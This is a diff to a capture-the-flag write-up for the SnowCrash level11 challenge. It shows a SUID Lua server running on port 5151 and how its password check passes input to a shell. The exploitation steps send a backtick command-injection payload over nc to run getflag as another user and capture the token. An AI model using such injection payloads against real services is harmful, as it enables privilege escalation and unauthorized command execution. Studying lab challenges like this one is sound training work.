@@ -15,7 +15,26 @@ In the home directory, there's a Lua script `level11.lua` with SUID/GUID bits se
 	-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
 	```
 
-2. **Script Content:**
+2. **Script Status:**
+	```bash
+	level11@SnowCrash:~$ ./level11.lua
+	lua: ./level11.lua:3: address already in use
+	stack traceback:
+		[C]: in function 'assert'
+		./level11.lua:3: in main chunk
+		[C]: ?
+	```
+	This error message indicates that the script is already running since the port it tries to bind to is already in use.
+	We can confirm this by checking running processes:
+	
+	```bash
+	level11@SnowCrash:~$ ps aux | grep lua
+	flag11    1852  0.0  0.0   2896   960 ?        S    12:30   0:00 lua /home/user/level11/level11.lua
+	level11   2138  0.0  0.0   4380   820 pts/0    S+   13:01   0:00 grep --color=auto lua
+	```
+	The output shows that the script is indeed running under the flag11 user. 
+
+3. **Script Content:**
 	```lua
 	#!/usr/bin/env lua
 	local socket = require("socket")
@@ -66,6 +85,7 @@ In the home directory, there's a Lua script `level11.lua` with SUID/GUID bits se
    - Command injection is possible through backticks or shell operators
 
 ### III - Exploitation Steps
+Since the script is running a `server` on port `5151`, we can use **Netcat** to connect to it and exploit the command injection vulnerability.
 
 1. **Verify Privilege Escalation:**
 	```bash
@@ -79,12 +99,12 @@ In the home directory, there's a Lua script `level11.lua` with SUID/GUID bits se
 2. **Retrieve the Flag:**
 	```bash
 	level11@SnowCrash:~$ nc 127.0.0.1 5151
-	Password: `getflag` > /tmp/token
+	Password: `getflag > /tmp/token`
 	Erf nope..
 	level11@SnowCrash:~$ cat /tmp/token
 	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 	```
 
 	*Note:*  
-	*- `nc` (Netcat) command: allows us to connect to the Lua script's server running on port `5151`.*  
+	*- `nc` command: allows us to connect to the Lua script's server running on port `5151`.*  
 	*- `127.0.0.1`: is the loopback address, which refers to the **localhost**.*
